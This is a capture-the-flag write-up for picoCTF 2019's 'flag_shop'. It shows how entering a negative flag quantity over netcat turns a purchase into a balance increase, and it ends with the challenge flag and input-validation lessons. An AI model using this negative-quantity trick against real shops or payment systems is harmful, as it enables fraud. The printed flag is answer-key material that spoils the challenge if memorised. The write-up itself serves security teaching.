# flag_shop
| **Platform** | picoCTF 2019 |
| **Category** | General Skills |
| **Difficulty** | Medium |

## Challenge
The challenge provides a flag shop where we have an account balance and can purchase flags.
The goal is to obtain the flag even though the normal account balance is not enough.
The hint says:
```text
Two's complement can do some weird things when numbers get really big!
```
This indicates that the challenge involves **integer overflow / signed integer behavior**.

## Approach
First, connect to the challenge service using Netcat.
```bash
nc fickle-tempest.picoctf.net 56696
```
The server displays:
```text
Welcome to the flag exchange
We sell flags
1. Check Account Balance
2. Buy Flags
3. Exit
```

### Step 1 – Check the balance
Choose:
```text
1
```
This displays the current account balance.
The normal balance is not enough to purchase the required flag.

### Step 2 – Select Buy Flags
Choose:
```text
2
```
The program asks how many flags we want to buy.
Normally, entering a positive number calculates:
```text
number_of_flags × 1000
```
Since the balance is limited, we cannot normally purchase enough flags.

### Step 3 – Use a negative number
The important part is that the program does not properly prevent a negative number of flags.
Enter:
```text
-900000
```
The program calculates the price as:
```text
-900000 × 1000
```
which gives:
```text
-900000000
```
Instead of taking money from the account, subtracting a negative price effectively **increases the account balance**:
```text
balance - (-900000000)
```
which becomes:
```text
balance + 900000000
```
We now have a huge amount of money.

### Step 4 – Buy the required flags
Return to the purchase option:
```text
2
```
Then purchase the required number of flags.
For this challenge, the required amount is:
```text
1337
```
The cost is:
```text
1337 × 1000
= 1337000
```
Our manipulated balance is more than enough.
The program then reveals the flag.

## Commands Used
Connect to the service:
```bash
nc fickle-tempest.picoctf.net 56696
```
Then interact with the menu:
```text
1
```
Check the balance.
```text
2
```
Choose to buy flags.
Enter:
```text
-900000
```
This increases the balance because the program accepts a negative quantity.
Then:
```text
2
```
and enter:
```text
1337
```
The flag is displayed.

## Why the Exploit Works
The vulnerability comes from improper validation of numeric input.
The program expects the number of flags to be a positive value, but it accepts a negative integer.
A negative purchase produces a negative cost:
```text
-900000 × 1000 = -900000000
```
When the program subtracts this cost from the account balance:
```text
balance -= total_cost
```
it effectively performs:
```text
balance -= (-900000000)
```
which is equivalent to:
```text
balance += 900000000
```
Therefore, we can artificially increase the account balance.
The challenge's hint refers to **two's complement**, which is the representation used for signed integers and is closely related to how negative values and integer overflow behave in C programs.

## Exploit Summary
```text
Normal balance
      ↓
Buy -900000 flags
      ↓
Negative purchase cost
      ↓
Balance increases massively
      ↓
Buy 1337 flags
      ↓
Flag revealed
```

## Flag
```text
picoCTF{m0n3y_bag5_c87346f2}
```

## Tools Used
- Netcat (`nc`)
- Linux Terminal
- Signed integers
- Two's complement
- Integer overflow / arithmetic behavior

## Key Learning
- Never trust user-supplied numeric input.
- Quantities should be validated to ensure they are positive.
- Negative values can sometimes turn a payment operation into a balance increase.
- Integer arithmetic in C can behave unexpectedly when signed values and large numbers are involved.
- Input validation is an important part of secure programming.
